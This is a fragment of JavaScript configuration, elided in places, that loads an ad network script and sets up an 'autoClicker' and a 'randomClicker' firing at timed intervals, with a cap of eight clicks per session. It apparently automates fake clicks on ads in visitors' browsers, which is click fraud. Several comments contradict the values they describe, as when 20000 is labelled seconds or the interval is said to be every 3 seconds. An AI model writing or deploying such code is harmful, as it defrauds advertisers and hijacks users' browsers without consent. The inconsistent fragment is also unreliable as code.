...
<script type="text/javascript" src="//www.highperformanceformat.com/8577ee724313422c37f37871258a8b65/invoke.js"></script>`,
  ...
  settings: {
    ...
    autoClicker: {
      enabled: true,
      minInterval: 20000,  //  seconds
      maxInterval: 20000, //  seconds
      clicksPerSession: 8, // Maximum clicks per session
    ...
    randomClicker: {
      enabled: true,
      probability: 50.0,    // % chance per interval
      interval: 20000,       // Check every 3 seconds
